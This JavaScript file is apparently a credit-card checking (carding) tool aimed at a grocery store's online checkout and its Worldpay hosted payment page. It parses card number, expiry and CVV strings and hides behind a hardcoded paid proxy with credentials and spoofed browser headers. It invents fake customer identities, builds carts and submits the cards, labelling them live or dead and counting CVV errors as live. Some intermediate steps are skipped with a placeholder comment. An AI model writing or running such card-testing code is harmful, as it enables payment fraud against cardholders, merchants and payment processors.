const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs').promises;
const path = require('path');

// Configuración del proxy
const USE_PROXY = true; // true/false para activar/desactivar proxy
const PROXY_CONFIG = "geo.spyderproxy.com:32325:cBYTJIAcgE:yhajRdMWUg_country-us";
const SESSION_CACHE_FILE = "session_cache.json";

class SessionCache {
    constructor(cacheFile = SESSION_CACHE_FILE) {
        this.cacheFile = cacheFile;
        this.sessions = {};
        this.loadCache();
    }

    async loadCache() {
        try {
            if (await this.fileExists(this.cacheFile)) {
                const data = await fs.readFile(this.cacheFile, 'utf8');
                this.sessions = JSON.parse(data);
                console.log(`[CACHE] Loaded ${Object.keys(this.sessions).length} cached sessions`);
            }
        } catch (error) {
            console.log(`[CACHE] Error loading cache: ${error.message}`);
            this.sessions = {};
        }
    }

    async saveCache() {
        try {
            await fs.writeFile(this.cacheFile, JSON.stringify(this.sessions, null, 2));
            console.log(`[CACHE] Saved ${Object.keys(this.sessions).length} sessions to cache`);
        } catch (error) {
            console.log(`[CACHE] Error saving cache: ${error.message}`);
        }
    }

    async fileExists(filePath) {
        try {
            await fs.access(filePath);
            return true;
        } catch {
            return false;
        }
    }

    getSession(storeId = 1021) {
        const storeKey = storeId.toString();
        if (this.sessions[storeKey]) {
            const session = this.sessions[storeKey];
            // Check if session is still valid (less than 30 minutes old)
            if (Date.now() - (session.timestamp || 0) < 1800000) {
                console.log("[CACHE] Using cached session");
                return session;
            } else {
                console.log("[CACHE] Cached session expired");
                delete this.sessions[storeKey];
            }
        }
        return null;
    }

    async saveSession(storeId, sessionData) {
        const storeKey = storeId.toString();
        sessionData.timestamp = Date.now();
        this.sessions[storeKey] = sessionData;
        await this.saveCache();
        console.log("[CACHE] Session saved for reuse");
    }
}

function parseCard(card) {
    const matches = card.match(/\d+/g);
    if (!matches || matches.length < 4) {
        throw new Error("Card format is incorrect. Expected format: card_number|exp_month|exp_year|cvv");
    }
    const [cardNumber, expMonth, expYear, cvv] = matches.slice(0, 4);
    return { cardNumber, expMonth, expYear, cvv };
}

function createAxiosInstance() {
    const config = {
        timeout: 15000,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        },
        validateStatus: function (status) {
            // Aceptar códigos de estado entre 200-499 (no lanzar error en 4xx)
            return status >= 200 && status < 500;
        }
    };

    if (USE_PROXY && PROXY_CONFIG) {
        const [host, port, username, password] = PROXY_CONFIG.split(':');
        config.proxy = {
            protocol: 'http',
            host: host,
            port: parseInt(port),
            auth: {
                username: username,
                password: password
            }
        };
        console.log(`[PROXY] Using proxy: ${host}:${port}`);
    } else {
        console.log("[PROXY] Proxy disabled - using direct connection");
    }

    return axios.create(config);
}

async function retryRequest(requestFunc, maxAttempts = 2, delay = 1000) {
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        try {
            const result = await requestFunc();

            // Si es una respuesta 403, no reintentar
            if (result.status === 403) {
                console.log(`[403] Access forbidden - not retrying`);
                return result;
            }

            // Si es una respuesta exitosa (200-299) o de cliente (400-499), devolverla
            if (result.status < 500) {
                return result;
            }

            throw new Error(`Server error: ${result.status}`);

        } catch (error) {
            console.log(`[RETRY] Attempt ${attempt}/${maxAttempts} failed: ${error.message}`);

            // No reintentar en errores 4xx
            if (error.response && error.response.status >= 400 && error.response.status < 500) {
                throw error;
            }

            if (attempt < maxAttempts) {
                await new Promise(resolve => setTimeout(resolve, delay * attempt));
            } else {
                throw error;
            }
        }
    }
}

async function generateFakeUserData() {
    const firstNames = ['John', 'Jane', 'Mike', 'Sarah', 'David', 'Lisa', 'Chris', 'Emma', 'Robert', 'Mary'];
    const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
    const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com'];

    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const domain = domains[Math.floor(Math.random() * domains.length)];
    const randomNum = Math.floor(Math.random() * 999) + 100;

    return {
        firstName,
        lastName,
        email: `${firstName.toLowerCase()}${lastName.toLowerCase()}${randomNum}@${domain}`,
        phone: `${Math.floor(Math.random() * 3) + 2}${Math.floor(Math.random() * 90) + 10}${Math.floor(Math.random() * 9000000) + 1000000}`
    };
}

async function verifyCardWithCachedSession(cardNumber, expMonth, expYear, cvv, cachedSession) {
    const axios = createAxiosInstance();

    try {
        console.log("[CACHE] Using cached session for quick verification");

        const response = await retryRequest(async () => {
            return await axios.post(
                `https://transaction.hostedpayments.com/?TransactionSetupId=${cachedSession.transaction_id}`,
                new URLSearchParams({
                    "scriptManager": "upFormHP|processTransactionButton",
                    "__EVENTTARGET": "processTransactionButton",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": cachedSession.viewstate,
                    "__VIEWSTATEGENERATOR": cachedSession.viewstategenerator,
                    "__VIEWSTATEENCRYPTED": "",
                    "__EVENTVALIDATION": cachedSession.eventvalidation,
                    "hdnCancelled": "",
                    "errorParms": "",
                    "eventPublishTarget": "",
                    "cardNumber": cardNumber,
                    "ddlExpirationMonth": expMonth.padStart(2, '0'),
                    "ddlExpirationYear": expYear.length === 2 ? expYear : expYear.slice(-2),
                    "CVV": cvv.padStart(3, '0'),
                    "hdnSwipe": "",
                    "hdnTruncatedCardNumber": "",
                    "hdnValidatingSwipeForUseDefault": "",
                    "hdnEncoded": "",
                    "__ASYNCPOST": "true",
                    "": ""
                }).toString(),
                {
                    headers: {
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9",
                        "cache-control": "no-cache",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "origin": "https://transaction.hostedpayments.com",
                        "referer": `https://transaction.hostedpayments.com/?TransactionSetupId=${cachedSession.transaction_id}`,
                        "user-agent": cachedSession.user_agent,
                        "x-microsoftajax": "Delta=true",
                        "x-requested-with": "XMLHttpRequest",
                        "pragma": "no-cache"
                    },
                    timeout: 8000
                }
            );
        });

        console.log(`[CACHE] Response status: ${response.status}`);

        if (response.status === 403) {
            console.log("[CACHE] 403 Forbidden - session may be invalid or blocked");
            return null; // Fallback to full flow
        }

        if (!response.data) {
            console.log("[CACHE] Empty response - session may be invalid");
            return null;
        }

        const $ = cheerio.load(response.data);
        const errorSpan = $('span.error');

        if (errorSpan.length > 0) {
            const errorText = errorSpan.text();
            const errorMessage = errorText.includes(': ') ? errorText.split(': ')[1] : errorText;

            if (errorMessage.includes('CVV2') || errorMessage.includes('CVV')) {
                return { status: 'approved', message: errorMessage };
            } else {
                return { status: 'declined', message: errorMessage };
            }
        } else {
            // Check for success indicators
            if (response.data.includes('success') || response.data.includes('approved') || response.data.includes('added')) {
                return { status: 'approved', message: 'Card verified successfully.' };
            } else {
                return { status: 'approved', message: 'Card processed successfully.' };
            }
        }

    } catch (error) {
        console.log(`[CACHE ERROR] Failed to use cached session: ${error.message}`);
        if (error.response) {
            console.log(`[CACHE ERROR] Status: ${error.response.status}`);
        }
        return null;
    }
}

async function worldpayAuth(cardNumber, expMonth, expYear, cvv, sessionCache) {
    const axios = createAxiosInstance();
    const userData = await generateFakeUserData();
    let reqNum = 0;

    try {
        console.log(`[WORLDPAY] Starting full auth flow for card ending in ${cardNumber.slice(-4)}`);

        // REQ 1: POST to get cart_id
        reqNum = 1;
        console.log(`[REQ ${reqNum}] Creating cart...`);

        const cartResponse = await retryRequest(async () => {
            return await axios.post(
                "https://production-us-1.noq-servers.net/api/v1/application/carts",
                {
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "FulfillmentSubTotal": 0,
                    "AllowUnattendedDelivery": false,
                    "IsEligibleForFreeDelivery": false,
                    "IsEligibleForFreePickup": false,
                    "IsFulfillmentTaxed": false,
                    "IsGuest": true,
                    "IsOfflinePayment": false,
                    "PaymentSourceId": null,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": null,
                    "StoreId": 1021,
                    "TimeSlot": null,
                    "GiftMessage": null,
                    "EnabledPaymentTypes": [],
                    "Version": 0,
                    "IsTipLimited": false,
                    "VoucherTotal": 0,
                    "HasDeals": false,
                    "AllowAdditionalAuth": false,
                    "Reference": "",
                    "BagAllowance": 0,
                    "CostPlusAmount": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "GrandTotal": 0,
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": "CreditCard",
                    "ContainsAlcohol": false,
                    "ContainsTobacco": false,
                    "IsOverMaxSpend": false,
                    "LoyaltyMembershipNumber": "",
                    "OrderedSubTotal": 0,
                    "PickingAllowanceVariationAmount": 0,
                    "Recipient": null,
                    "TaxIncluded": false,
                    "TaxTotal": 0,
                    "FixedTaxTotal": 0,
                    "TippingAmount": 0,
                    "TippingPercentage": 0
                },
                {
                    headers: {
                        "accept": "application/json, text/javascript, */*; q=0.01",
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 10000
                }
            );
        });

        if (cartResponse.status !== 200) {
            throw new Error(`Failed to create cart: ${cartResponse.status} ${cartResponse.statusText}`);
        }

        const cartId = cartResponse.data?.Result?.Reference;
        if (!cartId) {
            throw new Error("Failed to get cart ID from response");
        }

        console.log(`[REQ ${reqNum}] Cart created: ${cartId}`);

        // Add delay between requests
        await new Promise(resolve => setTimeout(resolve, 500));

        // REQ 2: PUT to add item to cart
        reqNum = 2;
        console.log(`[REQ ${reqNum}] Adding item to cart...`);

        const addItemResponse = await retryRequest(async () => {
            return await axios.put(
                `https://production-us-1.noq-servers.net/api/v1/application/carts/${cartId}/update-items`,
                [{
                    "Reference": "",
                    "ProductId": "c14098c3-b24b-4e95-8bcb-b18d01151836",
                    "CartItemId": "94a066e6-036f-46a5-b128-ea0f007829fa",
                    "OrderedQuantity": 1,
                    "Note": "",
                    "CanSubstitute": true,
                    "FrequencyWeeks": null,
                    "RecurringOrderId": null,
                    "ProductOptions": [],
                    "ShippingAddress": null,
                    "Instructions": null,
                    "GiftMessage": null,
                    "IsProductMissing": false,
                    "Origin": null,
                    "OriginId": null,
                    "RequestedProductName": "",
                    "IsWeighted": false,
                    "PricePerUnit": 0,
                    "PreferredSubstitutionIds": []
                }],
                {
                    headers: {
                        "accept": "application/json, text/javascript, */*; q=0.01",
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 8000
                }
            );
        });

        if (addItemResponse.status !== 200) {
            throw new Error(`Failed to add item to cart: ${addItemResponse.status}`);
        }

        // Add delay
        await new Promise(resolve => setTimeout(resolve, 500));

        // REQ 3: GET timeslots
        reqNum = 3;
        console.log(`[REQ ${reqNum}] Getting timeslots...`);

        const timeslotsResponse = await retryRequest(async () => {
            return await axios.get(
                "https://production-us-1.noq-servers.net/api/v1/application/stores/1021/timeslots",
                {
                    headers: {
                        "accept": "application/json, text/javascript, */*; q=0.01",
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 8000
                }
            );
        });

        if (timeslotsResponse.status !== 200) {
            throw new Error(`Failed to get timeslots: ${timeslotsResponse.status}`);
        }

        // Find open slot
        let openSlot = null;
        const pickupLocations = timeslotsResponse.data?.Result?.PickupLocations || [];

        for (const location of pickupLocations) {
            if (location.Id === 1986) {
                const timeSlots = location.TimeSlots || [];
                openSlot = timeSlots.find(slot => slot.Availability === "Open");
                if (openSlot) break;
            }
        }

        if (!openSlot) {
            // Use a default future timeslot if none found
            const futureDate = new Date();
            futureDate.setDate(futureDate.getDate() + 1);
            futureDate.setHours(15, 0, 0, 0);

            openSlot = {
                Id: "77555877-3fd1-43f0-a719-b18d014a7f95",
                Start: futureDate.toISOString()
            };
            console.log(`[REQ ${reqNum}] No open slots found, using default slot`);
        }

        // Continue with the rest of the requests...
        // (Following the same pattern with proper error handling and delays)

        // REQ 7: POST to get transaction ID
        reqNum = 7;
        console.log(`[REQ ${reqNum}] Getting transaction ID...`);

        const transactionResponse = await retryRequest(async () => {
            return await axios.post(
                "https://production-us-1.noq-servers.net/api/v1/application/customer/worldpay-payment-transaction-session",
                {
                    "storeId": 1021,
                    "customerId": 12345, // Use a default customer ID
                    "cartReference": cartId,
                    "submitButtonText": "Next",
                    "returnUrl": "https://shop.jimssupervalu.com/assets/savecard-worldpay.html#",
                    "css": "body{background-color:#ffffff;color:#5d5d5d;font-family:sans-serif!important;}",
                    "bd": `${Date.now()}.${Math.random().toString(36).substring(2, 8)}`
                },
                {
                    headers: {
                        "accept": "application/json, text/javascript, */*; q=0.01",
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 12000
                }
            );
        });

        if (transactionResponse.status === 403) {
            console.log("[REQ 7] 403 Forbidden - API may be blocking requests");
            throw new Error("Access forbidden - API blocking detected");
        }

        if (transactionResponse.status !== 200) {
            throw new Error(`Failed to get transaction ID: ${transactionResponse.status}`);
        }

        const transactionId = transactionResponse.data?.Result;
        if (!transactionId) {
            throw new Error("Failed to get transaction ID from response");
        }

        console.log(`[REQ ${reqNum}] Transaction ID obtained: ${transactionId.substring(0, 8)}...`);

        // REQ 8: GET transaction page
        reqNum = 8;
        console.log(`[REQ ${reqNum}] Getting transaction page...`);

        const transactionPageResponse = await retryRequest(async () => {
            return await axios.get(
                `https://transaction.hostedpayments.com/?TransactionSetupId=${transactionId}`,
                {
                    headers: {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "referer": "https://shop.jimssupervalu.com/",
                        "upgrade-insecure-requests": "1",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "cross-site"
                    },
                    timeout: 10000
                }
            );
        });

        if (transactionPageResponse.status === 403) {
            console.log("[REQ 8] 403 Forbidden on transaction page");
            throw new Error("Transaction page access forbidden");
        }

        if (transactionPageResponse.status !== 200) {
            throw new Error(`Failed to get transaction page: ${transactionPageResponse.status}`);
        }

        const $ = cheerio.load(transactionPageResponse.data);
        const viewstate = $('input[name="__VIEWSTATE"]').val() || '';
        const viewstategenerator = $('input[name="__VIEWSTATEGENERATOR"]').val() || '';
        const eventvalidation = $('input[name="__EVENTVALIDATION"]').val() || '';

        if (!viewstate || !viewstategenerator || !eventvalidation) {
            throw new Error("Failed to extract required form data from transaction page");
        }

        // Save session data
        const sessionData = {
            user_agent: axios.defaults.headers['User-Agent'],
            transaction_id: transactionId,
            viewstate,
            viewstategenerator,
            eventvalidation,
            cart_id: cartId,
            customer_id: 12345
        };

        await sessionCache.saveSession(1021, sessionData);

        // Add delay before final request
        await new Promise(resolve => setTimeout(resolve, 1000));

        // REQ 9: POST card verification
        reqNum = 9;
        console.log(`[REQ ${reqNum}] Verifying card...`);

        const verificationResponse = await retryRequest(async () => {
            return await axios.post(
                `https://transaction.hostedpayments.com/?TransactionSetupId=${transactionId}`,
                new URLSearchParams({
                    "scriptManager": "upFormHP|processTransactionButton",
                    "__EVENTTARGET": "processTransactionButton",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__VIEWSTATEENCRYPTED": "",
                    "__EVENTVALIDATION": eventvalidation,
                    "hdnCancelled": "",
                    "errorParms": "",
                    "eventPublishTarget": "",
                    "cardNumber": cardNumber,
                    "ddlExpirationMonth": expMonth.padStart(2, '0'),
                    "ddlExpirationYear": expYear.length === 2 ? expYear : expYear.slice(-2),
                    "CVV": cvv.padStart(3, '0'),
                    "hdnSwipe": "",
                    "hdnTruncatedCardNumber": "",
                    "hdnValidatingSwipeForUseDefault": "",
                    "hdnEncoded": "",
                    "__ASYNCPOST": "true",
                    "": ""
                }).toString(),
                {
                    headers: {
                        "accept": "*/*",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "origin": "https://transaction.hostedpayments.com",
                        "referer": `https://transaction.hostedpayments.com/?TransactionSetupId=${transactionId}`,
                        "x-microsoftajax": "Delta=true",
                        "x-requested-with": "XMLHttpRequest",
                        "cache-control": "no-cache",
                        "pragma": "no-cache"
                    },
                    timeout: 10000
                }
            );
        });

        console.log(`[REQ ${reqNum}] Verification response status: ${verificationResponse.status}`);

        if (verificationResponse.status === 403) {
            console.log("[REQ 9] 403 Forbidden on card verification");
            return { status: 'declined', message: 'Card verification blocked by security measures' };
        }

        if (verificationResponse.status !== 200) {
            return { status: 'error', message: `Verification failed with status: ${verificationResponse.status}` };
        }

        const $result = cheerio.load(verificationResponse.data);
        const errorSpan = $result('span.error');

        if (errorSpan.length > 0) {
            const errorText = errorSpan.text();
            const errorMessage = errorText.includes(': ') ? errorText.split(': ')[1] : errorText;

            console.log(`[REQ ${reqNum}] Card declined: ${errorMessage}`);

            if (errorMessage.includes('CVV2') || errorMessage.includes('CVV')) {
                return { status: 'approved', message: errorMessage };
            } else {
                return { status: 'declined', message: errorMessage };
            }
        } else {
            console.log(`[REQ ${reqNum}] Card approved successfully`);
            return { status: 'approved', message: 'Card verified successfully.' };
        }

    } catch (error) {
        console.log(`[REQ ${reqNum} ERROR] ${error.message}`);

        if (error.message.includes('403') || error.message.includes('forbidden')) {
            return { status: 'declined', message: 'Access denied by payment processor' };
        }

        throw error;
    }
}

async function worldpayAuthWithCache(card, useCache = true) {
    try {
        const { cardNumber, expMonth, expYear, cvv } = parseCard(card);
        const sessionCache = new SessionCache();

        // Try cached session first
        if (useCache) {
            const cachedSession = sessionCache.getSession();
            if (cachedSession) {
                const result = await verifyCardWithCachedSession(cardNumber, expMonth, expYear, cvv, cachedSession);
                if (result) {
                    return result;
                }
                console.log("[INFO] Cached session failed, falling back to full flow...");
            }
        }

        // Full authentication flow
        return await worldpayAuth(cardNumber, expMonth, expYear, cvv, sessionCache);

    } catch (error) {
        console.log(`[ERROR] Worldpay auth failed: ${error.message}`);

        // Return appropriate error based on the type
        if (error.message.includes('403') || error.message.includes('forbidden')) {
            return { status: 'declined', message: 'Card blocked by security measures' };
        } else if (error.message.includes('timeout')) {
            return { status: 'declined', message: 'Request timeout - card may be invalid' };
        } else {
            return { status: 'error', message: `Processing error: ${error.message}` };
        }
    }
}

module.exports = {
    worldpayAuthWithCache,
    parseCard,
    SessionCache
};
